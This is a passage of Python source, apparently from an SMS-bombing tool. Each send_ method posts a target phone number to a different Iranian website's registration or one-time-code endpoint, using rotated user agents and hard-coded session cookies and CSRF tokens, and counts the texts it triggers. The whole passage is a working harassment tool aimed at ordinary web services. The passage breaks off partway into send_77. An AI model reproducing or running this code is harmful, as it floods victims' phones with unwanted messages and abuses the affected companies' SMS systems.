    def send_53(self):
        try:
            paH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98; _wpfuuid=b21e7550-db54-469f-846d-6993cfc4815d','origin': 'https://www.pakhsh.shop','referer': 'https://www.pakhsh.shop/%D9%85%D8%B1%D8%A7%D8%AD%D9%84-%D8%AB%D8%A8%D8%AA-%D8%B3%D9%81%D8%A7%D8%B1%D8%B4-%D9%88-%D8%AE%D8%B1%DB%8C%D8%AF/','user-agent': choice(self.u_a),'x-requested-with': 'XMLHttpRequest'}
            ok = post(timeout=5, url='https://www.pakhsh.shop/wp-admin/admin-ajax.php', headers=paH, data=f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{self.number}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0').json()
            if ok['code'] == '1':
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_54(self):
        try:
            paH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'PHPSESSID=881f0d244b83c1db49d4c39e5fe7b108; digits_countrycode=98; _5f9d3331dba5a62b1268c532=true','origin': 'https://www.didnegar.com','referer': 'https://www.didnegar.com/my-account/?login=true&back=home&page=1','user-agent': choice(self.u_a),'x-requested-with': 'XMLHttpRequest'}
            ok = post(timeout=5, url='https://www.didnegar.com/wp-admin/admin-ajax.php', headers=paH, data=f'action=digits_check_mob&countrycode=%2B98&mobileNo={self.number}&csrf=4c9ac22ff4&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone.split("+98")[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=4c9ac22ff4').json()
            if ok['code'] == '1':
                self.count_ok += 1
            else:
                self.count_er += 1
        except: 
            pass
    def send_55(self):
        try:
            baH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9', 'content-type': 'application/json;charset=UTF-8','cookie': 'laravel_session=2Gp6A82VC8CPMgaB7sI0glrGP52XyjXNKnNAeZq3', 'origin': 'https://www.buskool.com', 'referer': 'https://www.buskool.com/register', 'user-agent': choice(self.u_a), 'x-csrf-token': 'trUVHIRWtjE58Fn9Pud1ciz2XaTbTgFHgCLsPykD', 'x-requested-with': 'XMLHttpRequest'}
            ok = post(timeout=5, url='https://www.buskool.com/send_verification_code', headers=baH, json={"phone": '0'+self.number}).json()
            if ok['status'] == True:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_56(self):
        try:
            kiH = {'Accept': 'application/json, text/plain, */*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Type': 'application/json', 'COUNTRY_ID': '2','Host': 'server.kilid.com','LOCALE': 'FA', 'Origin': 'https://kilid.com','Referer': 'https://kilid.com/','User-Agent': choice(self.u_a)}
            ok = post(timeout=5, url='https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL', headers=kiH, json={"mobile": '0'+self.number}).json()
            if ok['status'] == 'SUCCESS':
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_57(self):
        try:
            baH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9', 'authorization': 'Bearer undefined','content-length': '168', 'content-type': 'application/json;charset=UTF-8','origin': 'https://basalam.com','referer': 'https://basalam.com/','user-agent': choice(self.u_a),'x-client-info': '{"name":"web.public"}','x-creation-tags': '{"app":"web","client":"customer","os":"linux","device":"desktop","uri":"/accounts","fullPath":"/accounts","utms":"organic","landing_url":"basalam.com%2Faccounts","tag":[null]}'}
            ok = post(timeout=5, url='https://api.basalam.com/user', headers=baH, json={"variables": {"mobile": '0'+self.number},"query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"})
            if ok.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_58(self):
        try:
            seH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '33','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': '_ga=GA1.2.1824452401.1639326535; _gid=GA1.2.438992536.1639326535; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; crisp-client%2Fsession%2Fc55c0d24-98fe-419a-862f-0b31e955fd59=session_812ec81d-13c1-4a69-a494-ad54e1f290ef; __utma=55084201.1824452401.1639326535.1639326540.1639326540.1; __utmc=55084201; __utmz=55084201.1639326540.1.1.utmcsr=Ads|utmgclid=EAIaIQobChMIsfOridfe9AIV5o5oCR2zJQjCEAMYAiAAEgLT8fD_BwE|utmccn=Exact-shopsaz|utmcmd=cpc|utmctr=(not%20provided); _gac_UA-62787234-1=1.1639326540.EAIaIQobChMIsfOridfe9AIV5o5oCR2zJQjCEAMYAiAAEgLT8fD_BwE; __utmt=1; __utmb=55084201.3.10.1639326540; WHMCSkYBsAa1NDZ2k=6ba6de855ce426e25ea6bf402d1dc09c','origin': 'https://crm.see5.net','referer': 'https://crm.see5.net/clientarea.php','user-agent': choice(self.u_a),'x-requested-with': 'XMLHttpRequest'}
            ok = post(timeout=5, url= 'https://crm.see5.net/api_ajax/sendotp.php', headers=seH, data={'mobile': '0'+self.number,'action': 'sendsms'}).text
            if ok == 'send_sms':
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_59(self):
        try:
            ghH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9','content-type': 'application/json', 'origin': 'https://ghabzino.com','referer': 'https://ghabzino.com/','user-agent': choice(self.u_a)}
            ok = get(timeout=5, url='https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', headers=ghH, json={"Parameters": {"ApplicationType": "Web","ApplicationUniqueToken": None,"ApplicationVersion": "1.0.0","MobileNumber": '0'+self.number}}).json()
            if ok["Parameters"] != None:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_60(self):
        try:
            ghH = {'Accept': 'application/json','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Authorization': 'Bearer undefined','Connection': 'keep-alive','Content-Type': 'application/json','Host': 'www.simkhanapi.ir','Origin': 'https://simkhan.ir', 'Referer': 'https://simkhan.ir/','User-Agent': choice(self.u_a)}
            ok = post(timeout=5, url='https://www.simkhanapi.ir/api/users/registerV2', headers=ghH, json={"mobileNumber": '0'+self.number,"ReSendSMS": False}).json()
            if ok['Message'] == "ثبت نام شما با موفقیت انجام شد":
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_61(self):
        try:
            ghH = {'Accept': 'application/json', 'Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Authorization': 'Bearer undefined','Connection': 'keep-alive', 'Content-Type': 'application/json','Host': 'www.simkhanapi.ir','Origin': 'https://simkhan.ir','Referer': 'https://simkhan.ir/','User-Agent': choice(self.u_a)}
            ok = post(timeout=5, url='https://www.simkhanapi.ir/api/users/registerV2', headers=ghH, json={"mobileNumber": '0'+self.number,"ReSendSMS": True}).json()
            if ok['Message'] == "ثبت نام شما با موفقیت انجام شد":
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_62(self):
        try:
            ghH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','cookie': '.AspNetCore.Antiforgery.ej9TcqgZHeY=CfDJ8NPBKm5eTodHlBQhmwjQAVWqg8-UO73YXzMYVhYk28IlZQexrnyEhYldxs2Ylnp3EZE2o3tccNQ0E7vRSUGVMNDfmcFOKPcUCG7sysT7unE5wui_vwzMvyCNDqIRZ1Wxd2AKD3s3lu-2BvFOXc_j7ts; anonymousId=-fmvaw07O1miRXbHtKTVT; segmentino-user={"id":"-fmvaw07O1miRXbHtKTVT","userType":"anonymous"}; _613757e830b8233caf20b7d3=true; _ga=GA1.2.1051525883.1639482327; _gid=GA1.2.2109855712.1639482327; __asc=bf42042917db8c3006a2b4dcf49; __auc=bf42042917db8c3006a2b4dcf49; analytics_token=a93f2bb1-30d0-4e99-18cc-b84fcda27ae9; yektanet_session_last_activity=12/14/2021; _yngt_iframe=1; _gat_UA-126198313-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_session_token=efcee442-344d-1374-71b8-60ca960029c9; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _gac_UA-126198313-1=1.1639482345.EAIaIQobChMImrmRrJvj9AIV2ZTVCh07_gUpEAAYASAAEgILoPD_BwE; cache_events=true','origin': 'https://www.drsaina.com','referer': 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation','upgrade-insecure-requests': '1','user-agent': choice(self.u_a)}
            ok = post(timeout=5, url= 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation', headers=ghH, data=f"__RequestVerificationToken=CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJN4BxSjZ24pukCJF2AQiWg&noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber={'0'+self.number}&confirmCode=&fullName=&Password=&Password2=").text
            if 'کد تایید 6 رقمی پیامک شده به شماره' in ok:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_63(self):
        try:
            ghH = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Cache-Control': 'no-cache, private','Content-Encoding': 'gzip','Content-Type': 'application/json', 'Cookie': 'laravel_session=eyJpdiI6InY0T2JYTndZb0xacURzcXFtWWxORHc9PSIsInZhbHVlIjoiUmo1bVd0UklmdjJyc1wvZGNHVDRuRU96RVZVZFhpb1N4ZmJ3NkduUGJYMGhyRG42QVNwVUNHVlZZRUNqV0hjUysiLCJtYWMiOiIzNTBlOWIzOTkxMDYyM2EzNzViYWFhYjdkM2FlNjQ1YmZjOTU3NzNiMjRlYjNlMmZiZmQzOGRkZTI0Yzc0NTU1In0%3D','Host': 'api.binjo.ir','Upgrade-Insecure-Requests': '1','User-Agent': choice(self.u_a)}
            ok = requests.get(timeout=5, url=f"https://api.binjo.ir/api/panel/get_code/{'0'+self.number}", headers=ghH, verify=False).json()
            if ok['status'] == 'ok':
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_64(self):
        try:
            liH = {'Accept': 'application/json, text/javascript, */*; q=0.01','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9',  'Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'sess=00da3860-929a-4429-aef9-82bb64f9a439; basalam-modal=1','Host': 'my.limoome.com','Origin': 'https://my.limoome.com', 'Referer': 'https://my.limoome.com/login?redirectlogin=%252Fdiet%252Fpayment','User-Agent': choice(self.u_a),'X-Requested-With': 'XMLHttpRequest'}
            liR = post(timeout=5, url='https://my.limoome.com/api/auth/login/otp', headers=liH, data={'mobileNumber': "+98"+self.number,'country': '1'}).json()
            if liR['status'] == 'success':
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_65(self):
        try:
            liH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cookie': '_gcl_aw=GCL.1639580987.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _gcl_au=1.1.1134321035.1639580987; _ga=GA1.2.74824389.1639580987; _gid=GA1.2.40868592.1639580992; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_token=9fbae680-00a7-8cbf-6be6-90980eae790f; yektanet_session_last_activity=12/15/2021; _yngt_iframe=1; _gac_UA-89339097-1=1.1639580999.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _clck=dlyt9o|1|exa|0; crisp-client%2Fsession%2Fbde9082c-438a-4943-b9b5-362fed0a182a=session_2fdd45a5-8c9d-4638-b21a-40a2ebd422db; _clsk=ktdj0|1639581807259|2|1|d.clarity.ms/collect; _ga_5LWTRKET98=GS1.1.1639580986.1.1.1639581904.60','device': 'web','deviceid': '3', 'origin': 'https://bimito.com','referer': 'https://bimito.com/','user-agent': choice(self.u_a),'user-token': 'swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp'}
            liR = post(timeout=5, url=f"https://bimito.com/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%220{self.number}%22%7D", headers=liH).json()
            if liR['message'] == 'کاربر قبلا ثبت نام نکرده است':
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_66(self):
        try:
            liH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cookie': '_gcl_aw=GCL.1639580987.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _gcl_au=1.1.1134321035.1639580987; _ga=GA1.2.74824389.1639580987; _gid=GA1.2.40868592.1639580992; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_token=9fbae680-00a7-8cbf-6be6-90980eae790f; yektanet_session_last_activity=12/15/2021; _yngt_iframe=1; _gac_UA-89339097-1=1.1639580999.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _clck=dlyt9o|1|exa|0; crisp-client%2Fsession%2Fbde9082c-438a-4943-b9b5-362fed0a182a=session_2fdd45a5-8c9d-4638-b21a-40a2ebd422db; _clsk=ktdj0|1639581807259|2|1|d.clarity.ms/collect; _ga_5LWTRKET98=GS1.1.1639580986.1.1.1639581904.60','device': 'web','deviceid': '3', 'origin': 'https://bimito.com','referer': 'https://bimito.com/','user-agent': choice(self.u_a), 'user-token': 'swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp'}
            liR = post(timeout=5, url=f"https://bimito.com/api/core/app/user/loginWithVerifyCode/%7B%22phoneNumber%22:%220{self.number}%22%7D", headers=liH).json()
            if liR['message'] == 'کاربر قبلا ثبت نام نشده است':
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_67(self):
        try:
            liH = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9','content-type': 'application/json','origin': 'https://developer.sibirani.com', 'referer': 'https://developer.sibirani.com/','user-agent': choice(self.u_a)}
            req = post(timeout=5, url="https://sandbox.sibirani.ir/api/v1/user/invite", headers=liH, json={"username": "0"+self.number})
            if req.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_68(self):
        try:
            gaH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate, br',  'accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','cookie': 'XSRF-TOKEN=eyJpdiI6IitzYVZRQzFLdGlKNHRHRjIxb3R4VWc9PSIsInZhbHVlIjoianR6SXBJXC9rUStMRCs0ajUzalNjM1pMN053bUNtSlJ5dzYrVzFxV1dtXC9SREp4OTJ0Wm1RWW9yRVwvM29Cc3l4SCIsIm1hYyI6IjdjODczZWI4Y2Q2N2NhODVkNjE5YTRkOWVhNjRhNDRlNmViZjhlNDVkNDYwODFkNzViOTU2ZTdjYTUwZjhjMWUifQ%3D%3D; laravel_session=eyJpdiI6ImU3dlpRdXV1XC9TMmJEWk1LMkFTZGJRPT0iLCJ2YWx1ZSI6IktHTWF0bFlJU0VqVCthamp5aW1GRHdBM1lNcjNMcVFxMWM5Ynd3clZLQzdva2ZJWXRiRU4xaUhyMnVHMG90RkUiLCJtYWMiOiJkZWRmMGM5YzFiNDNiOTJjYWFiZDc0MjYxMDUyMzBmYTMzMmI5ZTBkODA1YTMxODQyYzM2NjVjZWExZmYwMzdhIn0%3D','origin': 'https://www.mihanpezeshk.com','referer': 'https://www.mihanpezeshk.com/confirmcodePatient','upgrade-insecure-requests': '1','user-agent': choice(self.u_a)}
            req = post(url='https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient', headers=gaH, data=f'_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile={"0"+self.number}&recaptcha=')
            if req.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass 
    def send_69(self):
        try:
            meH = {"Accept": "application/json","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Connection": "keep-alive","Content-Type": "application/json","Cookie": "_ga=GA1.2.1307952465.1641249170; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=2527d893-9de1-8fee-9f73-d666992dd3d5; _yngt=9d6ba2d2-fd1c-4dcc-9f77-e1e364af4434; _hjSessionUser_619539=eyJpZCI6IjcyOTJiODRhLTA2NGUtNTA0Zi04Y2RjLTA2MWE3ZDgxZDgzOSIsImNyZWF0ZWQiOjE2NDEyNDkxNzEzMTUsImV4aXN0aW5nIjp0cnVlfQ==; _gid=GA1.2.284804399.1642278349; _gat_gtag_UA_106934660_1=1; _gat_UA-0000000-1=1; analytics_session_token=238e3f23-aff7-8e3a-f1d4-ef4f6c471e2b; yektanet_session_last_activity=1/15/2022; _yngt_iframe=1; _gat_UA-106934660-1=1; _hjIncludedInSessionSample=0; _hjSession_619539=eyJpZCI6IjRkY2U2ODUwLTQzZjktNGM0Zi1iMWUxLTllY2QzODA3ODhiZCIsImNyZWF0ZWQiOjE2NDIyNzgzNTYzNjgsImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0","Host": "www.hamrah-mechanic.com","Origin": "https://www.hamrah-mechanic.com","Referer": "https://www.hamrah-mechanic.com/membersignin/", "Source": "web", "TE": "trailers","User-Agent": choice(self.u_a)}
            meD = {"landingPageUrl": "https://www.hamrah-mechanic.com/","orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/","phoneNumber": "0"+self.number,"prevDomainUrl": None,"prevUrl": None,"referrer": "https://www.google.com/"}
            meR = post(url='https://www.hamrah-mechanic.com/api/v1/auth/login', headers=meH, data=meD).json()
            if meR['isSuccess']:
                self.count_ok += 1
            else:
                self.count_er += 1
        except: pass

    def send_70(self):
        try:
            cookies = {'PHPSESSID': 'jvbrfcd73hp86mu1i17111qu3hsr333d65gd6sgu59obqnm30vvf3ih5bgtu9ehg','_uid_': '858da6b4256c7bc0d4fb9015f6573bbc','tracker_glob_new': 'fxyj9Ou','tracker_session': 'aPZpSfQ','TS014b5e07': '0102310591d5ebb0c9ff6945c19f66a782df389d99d17306ab82b10ff73a07faf1e5bfdc1aaf8f1a471e99dfc63dc303fc65cfa006d826158911ed6e5bfbb0697cc92d319a00b383de979a249c3de829f05c045ba8be6a312d48f9c30e1ae461eaa0af94bbaa257613ec8d3436f1208e0c6ee6325d','sn_tracker_campaign': '{"u_medium":"Direct","u_source":"Direct","u_campaign":"Direct","u_term":"Direct","u_content":"Direct"}','_gid': 'GA1.2.1272028541.1648804087','_gat_UA-83129158-1': '1', '__asc': '1140dbea17fe461c6994f4b4f42','__auc': '1140dbea17fe461c6994f4b4f42','_ga': 'GA1.1.774330250.1648804087','_xpid': '3866274557', '_xpkey': 'k69hC7CEHeHH_b8LhjnCTp6wBiHV71mE','_conv_v': 'vi%3A1*sc%3A1*cs%3A1648804089*fs%3A1648804089*pv%3A1', '_conv_s': 'si%3A1*sh%3A1648804089064-0.14345041879841114*pv%3A1','_hjSessionUser_2775789': 'eyJpZCI6IjEyMzA2YzM5LTk5ZGEtNTM0NC1iYzRmLTIzMzAxOTRkOTNlYSIsImNyZWF0ZWQiOjE2NDg4MDQwODk1MjgsImV4aXN0aW5nIjpmYWxzZX0=','_hjFirstSeen': '1','_hjIncludedInSessionSample': '0','_hjSession_2775789': 'eyJpZCI6ImVhNmU1ZWMyLTc3MGYtNGY4Mi04OTE0LTJhMzE4OTdjMjIyMSIsImNyZWF0ZWQiOjE2NDg4MDQwODk1NDMsImluU2FtcGxlIjpmYWxzZX0=','_hjIncludedInPageviewSample': '1','_hjAbsoluteSessionInProgress': '1','_ga_84EMKEXT1M': 'GS1.1.1648804086.1.0.1648804094.52',}
            headers = {'authority': 'www.digistyle.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"', 'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','upgrade-insecure-requests': '1','origin': 'https://www.digistyle.com','user-agent': choice(self.u_a),'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://www.digistyle.com/users/login-register/','accept-language': 'en-US,en;q=0.9',}
            req70 = requests.post('https://www.digistyle.com/users/login-register/', headers=headers, cookies=cookies,data={'loginRegister[email_phone]': "98"+self.number})
            if req70.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass        

    def send_71(self):
        try:
            headers = {'authority': 'api.behtarino.com','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','accept': 'application/json','sec-ch-ua-mobile': '?0','user-id': 'undefined','user-agent': choice(self.u_a),'sec-ch-ua-platform': '"Windows"','origin': 'https://behtarino.com','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://behtarino.com/','accept-language': 'en-US,en;q=0.9',}
            req71 = requests.post('https://api.behtarino.com/api/v1/users/phone_verification/', headers=headers, json={'phone':"98"+self.number})
            if req71.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_72(self):
        try:
            cookies = {'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}','_gid': 'GA1.2.1501131300.1648803870', '_gat_gtag_UA_57199074_1': '1','_gat_UA-57199074-6': '1','_ga': 'GA1.1.1462659137.1648803870', 'G_ENABLED_IDPS': 'google','_ga_E5KGQWCMD3': 'GS1.1.1648803869.1.0.1648803877.0','_ga_E1VQ34D215': 'GS1.1.1648803870.1.0.1648803877.0',}
            headers = { 'Connection': 'keep-alive','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-mobile': '?0','User-Agent': choice(self.u_a),'session': 'undefined', 'sec-ch-ua-platform': '"Windows"', 'Accept': '*/*','Origin': 'https://taaghche.com', 'Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://taaghche.com/','Accept-Language': 'en-US,en;q=0.9'}

            req72 = requests.post('https://gw.taaghche.com/v4/site/auth/signup', headers=headers, cookies=cookies, json= {'contact': "98"+self.number})
            if req72.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass


    def send_73(self):
        try:
            headers = {'authority': 'api.behtarino.com','user-id': 'undefined','accept': 'application/json','sec-ch-ua-mobile': '?0',  'user-agent': choice(self.u_a), 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-platform': '"Windows"', 'origin': 'https://behtarino.com','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://behtarino.com/','accept-language': 'en-US,en;q=0.9',}
            req73 = requests.post('https://api.behtarino.com/api/v1/users/phone_verification/', headers=headers,json={'phone':"+98"+ self.number})
            if req73.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_74(self):
        try:
            cookies = {'myzel': 's%3A_YCErOT0rtfbcuOjUWbqSSL43sLGLYQk.rZggCLOnFSH7YjmolLylkyvLnSKLIxkt8mtsfy1QeLk','io': 'sgU_HLtxRXRUG6JaAGHu','_gid': 'GA1.2.405097496.1648570870','_gat_UA-221448445-1': '1','_ga': 'GA1.1.1782891286.1648570870','_ga_YEL6FL8NQ3': 'GS1.1.1648570869.1.0.1648570870.59',}
            headers = {'authority': 'myzel.ir','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','pragma': 'no-cache','x-is-app': 'false','x-app-version': '0','x-client-version': '0.5.82','sec-ch-ua-mobile': '?0', 'user-agent': choice(self.u_a),'content-type': 'application/json;charset=UTF-8', 'accept': 'application/json, text/plain, */*','sec-ch-ua-platform': '"Windows"', 'origin': 'https://myzel.ir', 'sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty','referer': 'https://myzel.ir/app/login','accept-language': 'en-US,en;q=0.9',}
            req74 = requests.post('https://myzel.ir/auth/login', headers=headers, cookies=cookies, json={"cell": "+98"+self.number})
            if req74.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_75(self):
        try:
            cookies = { '_gid': 'GA1.2.1807893839.1648570705','_gat_UA-144175006-1': '1','__asc': 'a90f885617fd678a6b100b695a6','__auc': 'a90f885617fd678a6b100b695a6','_ga_SS4L1K9M54': 'GS1.1.1648570704.1.1.1648570709.0','_ga': 'GA1.2.1506308706.1648570705',}
            headers = {'authority': 'karpishe.com', 'content-length': '0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','accept': 'application/json, text/plain, */*','x-utm': '{"kp_url":"https://karpishe.com/login"}','sec-ch-ua-mobile': '?0','user-agent': choice(self.u_a), 'x-kp-guestid': '4f1a2caa-229b-4e34-ac8c-258b8bb0be69', 'sec-ch-ua-platform': '"Windows"','origin': 'https://karpishe.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty', 'referer': 'https://karpishe.com/login','accept-language': 'en-US,en;q=0.9',}
            req75 = requests.post(f'https://karpishe.com/api/auth/authenticate/+98{self.number}', headers=headers, params={'otp': 'true',},cookies=cookies)
            if req75.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass

    def send_76(self):
        try:
            cookies = {'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}','analytics_token': 'a8d32e4f-6f08-c61c-1a02-cfea519e615f','analytics_session_token': 'd5b4c862-52b9-3c70-54d6-9d68d5456b56','yektanet_session_last_activity': '3/29/2022','_yngt_iframe': '1','sib_cuid': 'd14e6831-d8d1-4b30-8a30-050fb0d929d0','_ga': 'GA1.2.2136389016.1648570623','_gid': 'GA1.2.1923408822.1648570623','_gat_gtag_UA_123736353_1': '1', '_gat_UA-123736353-1': '1','_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce','_60190d10aeeec174b6302f92': 'true','popoup': 'true',}
            headers = {'authority': 'www.jeanswest.ir','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','accept': '*/*','content-type': 'application/x-www-form-urlencoded', 'x-requested-with': 'XMLHttpRequest', 'sec-ch-ua-mobile': '?0','user-agent': choice(self.u_a), 'sec-ch-ua-platform': '"Windows"', 'origin': 'https://www.jeanswest.ir','sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty','referer': 'https://www.jeanswest.ir/%D8%AE%D8%B1%DB%8C%D8%AF-%D8%A7%D9%88%D9%84%DB%8C/','accept-language': 'en-US,en;q=0.9',}
            req76 = requests.post('https://www.jeanswest.ir/first-order-api/', headers=headers, params={'api': 'register',},cookies=cookies, data={'mobile': self.number})
            if req76.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_77(self):
        try:
            cookies = {'PHPSESSID': '33ge3stroa2cnj6q28a4ar08i9',  '_gid': 'GA1.2.1905143675.1648569960','_gat_UA-105359548-1': '1', '_ga_V8WNMKED86': 'GS1.1.1648569960.1.0.1648569960.0','_ga': 'GA1.1.1023482234.1648569960',}
